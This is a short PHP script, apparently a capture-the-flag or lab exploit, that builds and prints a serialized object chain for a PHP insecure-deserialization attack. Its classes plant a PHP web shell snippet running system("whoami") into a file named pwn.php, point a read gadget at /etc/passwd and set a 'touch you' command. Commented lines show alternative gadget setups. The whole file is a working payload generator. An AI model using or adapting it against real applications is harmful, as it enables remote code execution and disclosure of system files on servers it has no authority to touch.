<?php

class pwned
{
    public function __construct()
    {
        $this->command = "touch you";
    }
}

class LogFile
{
    public function __construct()
    {
        $this->filename = "pwn.php";
        $this->username = '<?php system("whoami"); ?>';
    }
}

class ReadFile
{
    public function __construct()
    {
        $this->filename = "/etc/passwd";
    }
}

class User
{
    public function __construct()
    {
        // $this->username[0] = new LogFile();
        // $this->isAdmin[0] = False;
        // $this->username[1] = new LogFile();
        // $this->isAdmin[1] = False;
        $this->username = new pwned();
        $this->isAdmin = False;
    }
}

$obj = new User();
echo serialize($obj);
?>
